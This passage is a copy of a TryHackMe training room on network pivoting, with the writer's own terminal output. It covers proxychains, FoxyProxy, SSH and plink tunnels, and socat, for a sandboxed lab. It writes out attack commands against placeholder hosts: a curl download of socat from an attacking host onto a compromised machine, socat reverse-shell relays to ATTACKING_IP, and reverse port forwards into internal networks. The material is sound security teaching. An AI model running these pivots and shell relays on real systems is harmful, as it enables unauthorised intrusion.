# Wreath — Writeup

## Overview
### Wreath — Writeup
### Wreath — Writeup
----
Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network. (Streak limitation only for non-subscribed users)
----
![](https://assets.tryhackme.com/room-banners/wreath_banner.png)
![[Pasted image 20230603132636.png]]
Download Task Files
[**Video**](https://youtu.be/UHU2GcA_hrY)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/ffa81460a5c1487dd7bb43d0ca0735a1.png)
Wreath is designed as a learning resource for beginners with a primary focus on:
- Pivoting
- Working with the Empire C2 (**C**ommand and **C**ontrol) framework
- Simple Anti-Virus evasion techniques
The following topics will also be covered, albeit more briefly:
- Code Analysis (Python and PHP)
- Locating and modifying public exploits
- Simple webapp enumeration and exploitation
- Git Repository Analysis
- Simple Windows Post-Exploitation techniques
- CLI Firewall Administration (CentOS and Windows)
- Cross-Compilation techniques
- Coding wrapper programs
- Simple exfiltration techniques
- Formatting a pentest report
These will be taught in the course of exploiting the Wreath network.
This is designed as almost a sandbox environment to follow along with the teaching content; the focus will be on the above teaching points, rather than on initial access and privilege escalation exploits (contrary to other boxes on the platform where the focus is on the challenge).
---
_**Tools:**_
A zipfile containing the tools demonstrated throughout this room is attached to this task. That said, whilst these will work, it would be advisable to download the latest versions of the tools (as instructed by the tasks) during your progression through the content, rather than relying on the provided archive. The password for this zipfile is: `WreathNetwork`.
---
_**Videos:**_
[@DarkStar7471](https://twitter.com/DarkStar7471) has kindly created a series of videos to accompany the teaching content in the Wreath network. Please use these as your first line of support! Writeups in the form of pentest reports will also be made available.
The videos can be accessed directly from Dark's [YouTube channel](https://www.youtube.com/playlist?list=PLsqUCyw0Jf9sMYXly0uuwfKMu34roGNwk); however, each task in this room also contains a link to the relevant video.
Look for the "Play" button at the very bottom right of the screen:
This will update on a task-by-task basis so that it always points to the correct video.
---
_**Prerequisites:**_
This network is designed for beginners, but assumes basic competence in the [Linux command line](https://tryhackme.com/room/linuxfundamentalspart1) and fundamental hacking methodology. The ability to read and write a little code will also be useful. Any other required knowledge will be linked throughout the tasks. If you need help, please feel free to ask in the [TryHackMe Discord](https://discord.gg/tryhackme) -- there is a channel set up for this purpose in the help section there.
---
_**Conduct:**_
As this network is shared amongst a number of people, it goes without saying: please don't mess things up for others in the network. There are no password changes required in any of these tasks, and no files need deleted. At various stages in this network it will be necessary to upload files and tools to the remote box. Please upload these in the format: `toolname-username` (e.g. `socat-MuirlandOracle`, `shell-MuirlandOracle.aspx`, etc) to avoid overwriting work belonging to anyone else. In short, don't be a troll, be respectful, and have fun!
With that being said:- let's get started!
﻿
Answer the questions below
Read the introduction
Question Done
### Task 2  Intro Accessing the Network
[**Video**](https://youtu.be/UHU2GcA_hrY)
Before we get into the content, we need to know how to access the network.
Joining the network requires a 7 day streak or a subscription to TryHackMe. To limit the number of networks which have to stay active at any one point, network access will last for 10 days after joining, at which point you will be automatically be removed; however, rejoining does not require a streak so if you didn't manage to finish within the ten days, you are free to rejoin immediately and keep at it from where you left off. Progress will not be reset.
Whether you are using the AttackBox or a local machine to connect to the TryHackMe network, you will need to use OpenVPN with a connection pack specifically designed for this network.
If you are using a local machine then you will need to download a configuration pack from the [Access](https://tryhackme.com/access) page.
If you are a subscriber and are using the AttackBox then you will be able to find this connection pack in a directory on your desktop. This will be automatically connected when the AttackBox starts so **don't run the connection pack manually on the AttackBox if you are a subscriber.**
If you are not subscribed then you will need to download the connection pack as normal, copy and paste the contents into a file on the AttackBox, then connect as you would on a local VM.
Be aware that this is still a VPN (albeit with an automated startup sequence) on the AttackBox so you will need to use `ip a` to see your available IP addresses. Pick the one that starts with 10.50.x.x and use that for all reverse connections in the network.
_**Note:** You are encouraged to use your own VM when attacking the Wreath Network. The content in this room will be difficult to cover in the time available with a single AttackBox and the persistence of a local VM will be hugely advantageous. Equally, certain sections (such as the Empire section) will be very difficult to perform in the AttackBox. If you don't have a local Kali VM,_  _pre-built versions can be found for [VMware](https://images.kali.org/virtual-images/kali-linux-2020.4-vmware-amd64.7z) or [VirtualBox](https://images.kali.org/virtual-images/kali-linux-2020.4-vbox-amd64.ova); however, installing manually tends to be more reliable if you are comfortable doing so._
Answer the questions below
On the access page, click on the "Network" tab, then select "Wreath" from the dropdown menu:
![Network tab on the access page](https://assets.tryhackme.com/additional/wreath-network/465c6da06e91.png)
_**Note:** this will only appear if you have joined the room. If you are only viewing the room just now, click the "Join" button at the top right of this page!_
Click on the green download button on the access page and save the configuration pack somewhere on your local machine. If this does not work then you may have to click on the "Regenerate" button first, then give it ten seconds before attempting to download the pack.
Question Done
Connecting to OpenVPN on Linux (using either Kali or the AttackBox) can be accomplished using the `openvpn` client.
To do this, from the same directory we saved the config in we use the command:
`sudo openvpn CONFIG_NAME.ovpn`
Obviously replacing the name of the config with the config that you downloaded. Wreath config packs follow a naming scheme of `USERNAME-wreath.ovpn`, so an example command might be:
`sudo openvpn MuirlandOracle-wreath.ovpn`
![Successful OpenVPN connection sequence](https://assets.tryhackme.com/additional/wreath-network/9960e8de7561.png)
This should give you access to the Wreath network!
Question Done
Without closing the connection, open a new terminal (`Ctrl + T` in most cases). This is the easiest way (technically speaking) to run the OpenVPN client in the background whilst still being able to use the CLI. If you are comfortable using a terminal multiplexer (e.g. Tmux) to create a connection in the background then doing so would be a more elegant solution.
Question Done
**Controlling the Network:**
The network has three states: Running, Stopped, and Resetting.
The current state can be shown at the top right of the network box at the top of the page:
![Network Diagram Example](https://assets.tryhackme.com/additional/wreath-network/fe129fa984de.png)
- Running means that the network is fully operational and can be connected to at will
- Stopped indicates that the network has gone to sleep. This happens when no one has pressed the "Extend" button within a set time limit so as to prevent the network from being constantly running with no one using it. It can be restarted by pressing the "Start" button. This does _not_ reset the network back to a clean copy, so anything stored on the targets should still be there
- Resetting indicates that the network is currently in the process of being wiped clean and resetting back to its default state. This can be used when something (or someone) has happened to one of the targets rendering it broken
The three buttons below the network map can be used to control this functionality:
![Control buttons: Start, Extend, Reset](https://assets.tryhackme.com/additional/wreath-network/fbf6ced6514d.png)
- The "Start" button restarts the network once stopped
- The "Extend" button prevents the network from going to sleep. This button also contains a timer showing how long until the network shuts down
- The "Reset" button initiates a full wipe of the network. This requires a percentage of users in the network to click the button, thus preventing a single person from spamming resets
Finally, the "Network Uptime" field at the bottom right of the network map indicates how long the network has been awake for. This is not necessarily the time since the last reset.
Question Done
### Task 3  Intro Backstory
[**Video**](https://youtu.be/UHU2GcA_hrY)
_Out of the blue, an old friend from university: Thomas Wreath, calls you after several years of no contact. You spend a few minutes catching up before he reveals the real reason he called:_
> **_"So I heard you got into hacking? That's awesome! I have a few servers set up on my home network for my projects, I was wondering if you might like to assess them?"_**
_You take a moment to think about it, before deciding to accept the job -- it's for a friend after all._
_Turning down his offer of payment, you tell him:_
Answer the questions below
I'll do it!
Question Done
### Task 4  Intro Brief
[**Video**](https://youtu.be/UHU2GcA_hrY)
Thomas has sent over the following information about the network:
---
_There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference.
_
---
From this we can take away the following pieces of information:
- There are three machines on the network
- There is at least one public facing webserver
- There is a self-hosted git server somewhere on the network
- The git server is internal, so Thomas may have pushed sensitive information into it
- There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
- By the sounds of it this is likely to be the server variant of Windows, which might work in our favour
- The (assumed) Windows PC cannot be accessed directly from the webserver
This is enough to get started!
_**Note:** You are also encouraged to treat this Network like a penetration test -- i.e. take notes and screenshots of every step and write a full report at the end (especially if you're not already familiar with writing such reports). Keeping track of any files (e.g. tools or payloads) and users you create would also be a good idea. Reports will not be marked, but the act of writing them is good practice for any professional work -- or certifications -- you may do in the future. There will be more information on the actual report writing in the_ `Debrief & Report` _task, but for now just focus on extensive notes and screenshots. If you are not already comfortable taking notes, have a look into [CherryTree](https://www.giuspen.com/cherrytree/) or [Notion](https://www.notion.so/) as hierarchical notetaking applications and focus on documenting every step of the process. This room is written in a way that encourages easy note taking, so note down your kill-chain as you go along, and take lots of screenshots! Reports can be submitted to the room as writeups (in the format specified in the questions of  the_ `Debrief & Report` _task) -- the first five high-quality writeups submitted to the room are featured here!_
- _[CheckN8](https://assets.tryhackme.com/additional/wreath-network/writeups/CheckN8%20-%20Wreath.pdf)_
- _[fil](https://assets.tryhackme.com/additional/wreath-network/writeups/lolKatz%20-%20Wreath.pdf)_
- _[SefD](https://assets.tryhackme.com/additional/wreath-network/writeups/SefD%20-%20Wreath.pdf)_
- _[M4t35Z](https://assets.tryhackme.com/additional/wreath-network/writeups/M4t35Z%20-%20Wreath.pdf)_
- _[IamNobody](https://assets.tryhackme.com/additional/wreath-network/writeups/IamNobody%20-%20Wreath.pdf)_
Answer the questions below
Let's go!
Question Done
Before we start, if you are using Kali, make sure that it's up to date:
`sudo apt update && sudo apt upgrade`
This should not be necessary on the AttackBox.
Question Done
[**Video**](https://youtu.be/xv9bCJLv-DU)
The methods we use to pivot tend to vary between the different target operating systems. Frameworks like Metasploit can make the process easier, however, for the time being, we'll be looking at more manual techniques for pivoting.
There are two main methods encompassed in this area of pentesting:
- **Tunnelling/Proxying:** Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be _tunnelled_ inside another protocol (e.g. SSH tunnelling), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem (IDS) or firewall
Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.
- **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host
A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.
Port Forwarding tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.
Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed. It would be sensible at this point to also start to draw up a layout of the network as you see it -- although in the case of this practice network, the layout is given in the box at the top of the screen.
Linux is a command line operating system based on unix. There are multiple operating systems that are based on Linux.
As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.
The remaining tasks in this section will cover the following topics:
- Enumerating a network using native and statically compiled tools
- Proxychains / FoxyProxy
- SSH port forwarding and tunnelling (primarily Unix)
- plink.exe (Windows)
- socat (Windows and Unix)
- chisel (Windows and Unix)
- sshuttle (currently Unix only)
This is far from an exhaustive list of the tools available for pivoting, so further research is encouraged.
Answer the questions below
Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?
*Tunnelling*
**Research:** Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?
Google: "meterpreter command for port forwarding"
*portfwd*
[**Video**](https://youtu.be/vqLbUWpp1Hs)
In this task we'll be looking at two "proxy" tools: Proxychains and FoxyProxy. These both allow us to connect through one of the proxies we'll learn about in the upcoming tasks. When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.
Think of this as being something like a tunnel created between a port on our attacking box that comes out inside the target network -- like a secret tunnel from a fantasy story, hidden beneath the floorboards of the local bar and exiting in the palace treasure chamber.
Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.
---
**Proxychains**
Proxychains is a tool we have already briefly mentioned in previous tasks. It's a very useful tool -- although not without its drawbacks. Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.
That said, let's take a look at the tool itself.
Proxychains is a command line tool which is activated by prepending the command `proxychains` to other commands. For example, to proxy netcat  through a proxy, you could use the command:
`proxychains nc 172.16.0.10 23`
Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at `/etc/proxychains.conf`. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:
1. The current directory (i.e. `./proxychains.conf`)
2. `~/.proxychains/proxychains.conf`
3. `/etc/proxychains.conf`
This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: `cp /etc/proxychains.conf .`, then make any changes to the config file in a copy stored in your current directory. If you're likely to move directories a lot then you could instead place it in a `.proxychains` directory under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded from [here](https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf).
Speaking of the `proxychains.conf` file, there is only one section of particular use to us at this moment of time: right at the bottom of the file are the servers used by the proxy. You can set more than one server here to chain proxies together, however, for the time being we will stick to one proxy:
![Screenshot of the default proxychains configuration showing the [Proxylist] section](https://assets.tryhackme.com/additional/wreath-network/443c865e3ff3.png)
Specifically, we are interested in the "ProxyList" section:
`[ProxyList]   # add proxy here ...   # meanwhile   # defaults set to "tor"   socks4  127.0.0.1 9050`
It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor entrypoint, should you choose to run one on your attacking machine. That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being used for the proxies we'll be setting up in the following tasks.
There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:
![Screenshot showing the proxy_dns line in the Proxychains config](https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png)
If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the `proxy_dns` line using a hashtag (`#`) at the start of the line before performing a scan through the proxy!
![Proxy_DNS line commented out with a hashtag](https://assets.tryhackme.com/additional/wreath-network/557437aec525.png)
Other things to note when scanning through proxychains:
- You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  `-Pn`  switch to prevent Nmap from trying it.
- It will be _extremely_ slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).
---
**FoxyProxy**
Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!
People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we'll be looking at in subsequent tasks in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for [Firefox](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/) and [Chrome](https://chrome.google.com/webstore/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb). There are two versions of FoxyProxy available: Basic and Standard. Basic works perfectly for our purposes, but feel free to experiment with standard if you wish.
After installing the extension in your browser of choice, click on it in your toolbar:
![FoxyProxy Options button](https://assets.tryhackme.com/additional/wreath-network/c22f2ef3d6fc.png)
Click on the "Options" button. This will take you to a page where you can configure your saved proxies. Click "Add" on the left hand side of the screen:
![Highlighting the add button on the left hand side of the options menu](https://assets.tryhackme.com/additional/wreath-network/92e3cabe22e8.png)
Fill in the IP and Port on the right hand side of the page that appears, then give it a name. Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a good bet, although Chisel (which we will cover in a later task) requires SOCKS5. An example config is given here:![Example config showing SOCKS4, 127.0.0.1 and 1337 as the respective options](https://assets.tryhackme.com/additional/wreath-network/19436164d15e.png)
Press Save, then click on the icon in the task bar again to bring up the proxy menu. You can switch between any of your saved proxies by clicking on them:
![Highlighting how to switch proxies](https://assets.tryhackme.com/additional/wreath-network/1d91c2b6a625.png)
Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.
With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!
Answer the questions below
What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?
Use spaces between the values, not tabs.
*socks4 127.0.0.1 4242*
What command would you use to telnet through a proxy to 172.16.0.100:23?
The port is not strictly necessary here as it is the standard port for telnet connections; however, it is added here as an example.
*proxychains telnet 172.16.0.100 23*
You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
*FP*
[**Video**](https://youtu.be/CiW2zPPwfiQ)
The first tool we'll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it's possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.
---
**Forward Connections**
Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.
There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.
- Port forwarding is accomplished with the `-L` switch, which creates a link to a **L**ocal port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:
`ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`
We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 _on our own_ _attacking machine._ For example, by entering `localhost:8000` into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use `sudo` to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.
- Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:
`ssh -D 1337 user@172.16.0.5 -fN`
This again uses the `-fN` switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.
---
**Reverse Connections**
Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine _from_ the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:
1. First, generate a new set of SSH keys and store them somewhere safe (`ssh-keygen`):
![ssh-keygen process](https://assets.tryhackme.com/additional/wreath-network/62b2e09ba985.png)
This will create two new files: a private key, and a public key.
2. Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first.
3. On a new line, type the following line, then paste in the public key:
`command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`
This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
The final entry in the `authorized_keys` file should look something like this:
![The syntax shown above, in place within the file](https://assets.tryhackme.com/additional/wreath-network/055753470a05.png)
Next. check if the SSH server on your attacking machine is running:
`sudo systemctl status ssh`
If the service is running then you should get a response that looks like this (with "active" shown in the message):
![systemctl output when checking SSH is active. You should see active (running) in the output](https://assets.tryhackme.com/additional/wreath-network/08746aa1021e.png)
If the status command indicates that the server is not running then you can start the ssh service with:
`sudo systemctl start ssh`
The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.
With the key transferred, we can then connect back with a reverse port forward using the following command:
`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN   `
To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:
`ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN   `
This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!
In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
`ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`
This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.
_**Note:** Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems._
---
To close any of these connections, type `ps aux | grep ssh` into the terminal of the machine that created the connection:
![Highlighting the process id of the ssh proxy/port forward](https://assets.tryhackme.com/additional/wreath-network/daf8fd5c8540.png)
Find the process ID (PID) of the connection. In the above image this is 105238.
Finally, type `sudo kill PID` to close the connection:
![Killing the connection, demonstrating that the connection is now terminated](https://assets.tryhackme.com/additional/wreath-network/dc4393e7991e.png)
Answer the questions below
[**Video**](https://youtu.be/MSxRNTU4bUQ)
Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.
Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:
`cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N`
Notice that this syntax is nearly identical to previously when using the standard OpenSSH client. The `cmd.exe /c echo y` at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before.
To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:
`cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N`
Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with:
`puttygen KEYFILE -o OUTPUT_KEY.ppk`
Substituting in a valid file for the keyfile, and adding in the output file.
The resulting `.ppk` file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).
_**Note:** Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the_ `.exe`_. Whilst there is a copy pre-installed on Kali at_ `/usr/share/windows-resources/binaries/plink.exe`_, downloading a new copy from [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) before a new engagement is sensible._
Answer the questions below
```text
┌──(witty㉿kali)-[~/Downloads/wreath]
└─$ sudo apt install putty-tools
                                                                                                                            
┌──(witty㉿kali)-[~/Downloads/wreath]
└─$ cd .ssh 
                                                                                                                             
┌──(witty㉿kali)-[~/Downloads/wreath/.ssh]
└─$ ls
id_rsa  id_rsa.pub

┌──(witty㉿kali)-[~/Downloads/wreath/.ssh]
└─$ puttygen id_rsa -o id_rsa.ppk
Enter passphrase to load key: 
puttygen: error loading `id_rsa': decryption check failed

┌──(witty㉿kali)-[~/Downloads/wreath/.ssh]
└─$ puttygen id_rsa -o id_rsa.ppk    
Enter passphrase to load key: 
                                                                                                                             
┌──(witty㉿kali)-[~/Downloads/wreath/.ssh]
└─$ ls
id_rsa  id_rsa.ppk  id_rsa.pub
                                                                                                                             
┌──(witty㉿kali)-[~/Downloads/wreath/.ssh]
└─$ cat id_rsa.ppk 
PuTTY-User-Key-File-3: ssh-rsa
Encryption: aes256-cbc
Comment: witty@kali
....
```
What tool can be used to convert OpenSSH keys into PuTTY style keys?
*puttygen*
[**Video**](https://youtu.be/ydmlsRCQiIE)
Socat is not just great for fully stable Linux shells[[1]](https://tryhackme.com/room/introtoshells), it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both [Linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) and [Windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download). Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting: if you have completed the [What the Shell?](https://tryhackme.com/room/introtoshells) room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it's well worth experimenting with this in your own time.
Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:
![Diagram demonstrating the purpose of a relay to forward a shell back from a target PC](https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png)
It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.
Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above example we're creating a port forward _from_ a port on the compromised server _to_ a listening port on our own box. We could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the _attacking machine_ with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server.
Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.
**For example, with a Python webserver:-**
On Kali (inside the directory containing your Socat binary):
`sudo python3 -m http.server 80`
Then, on the target:
`curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME`
![Demonstration of using cURL with a Python HTTP server to upload files](https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png)
With the binary uploaded, let's have a look at each of the above scenarios in turn.
_**Note:** This uploads the socat binary with your username in the title; however, the example commands given in the rest of this task will refer to the binary simply as_ `socat`_._
---
**Reverse Shell Relay**
In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let's start a standard netcat listener on our attacking box (`sudo nc -lvnp 443`). Next, on the compromised server, use the following command to start the relay:
`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &   `
_**Note:** the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._
From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat on the remote server to simulate receiving a reverse shell from the target server:
![Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell](https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png)
A brief explanation of the above command:
- `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
- `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
- `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.
The relay connects back to a listener started using an alias to a standard netcat listener: `sudo nc -lvnp 443`.
In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.
---
**Port Forwarding -- Easy**
![222](https://assets.tryhackme.com/additional/wreath-network/YzM2ZWVlOGU5.png)The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &   `
This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The `fork` option is used to put every connection into a new process, and the `reuseaddr` option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use `&` to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.
We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.
---
**Port Forwarding -- Quiet**
The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not _massive_, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.
First of all, on our own attacking machine, we issue the following command:
`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`
This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the `fork` and `reuseaddr` options set, to allow us to create more than one connection using this port forward.
Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &   `
This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
`./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &   `
This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!
